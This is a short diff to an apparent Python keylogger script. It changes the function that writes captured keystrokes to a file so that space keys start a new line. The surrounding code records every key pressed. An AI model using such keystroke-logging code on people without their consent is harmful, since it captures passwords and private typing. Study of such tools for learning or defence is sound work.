@@ -25,6 +25,9 @@ def write_file(keys):
         for key in keys:
             # replaces quotation marks with a space
             k = str(key).replace("'","")
+            #find in the termnial for whenever Key.space is logged, if it does than log it as a new line
+            if k.find("space") > 0:
+                f.write('\n')
             f.write(str(key))
 
 #function to record when a key is released
